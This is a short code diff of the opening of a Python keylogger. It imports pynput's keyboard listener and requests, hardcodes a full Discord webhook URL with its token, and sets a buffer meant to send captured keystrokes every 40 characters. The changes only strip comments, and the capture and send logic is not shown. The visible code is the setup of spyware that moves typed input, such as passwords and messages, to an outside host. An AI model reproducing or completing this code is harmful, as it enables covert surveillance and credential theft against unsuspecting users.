@@ -1,10 +1,9 @@
 from pynput import keyboard
 import requests
 
-# ✅ Your Webhook URL from Discord
 WEBHOOK_URL = "https://discord.com/api/webhooks/1398711031383199794/lG-s9WyNwHkNyKSPmGZ_sR7rl8fQ1cymi94FRmTl46iqWoe9bEjX4QhUSu2HioHSSqE8"
 
-# Buffer to store keys before sending
+
 buffer = ""
 max_buffer_length = 40  # send every 40 characters
 
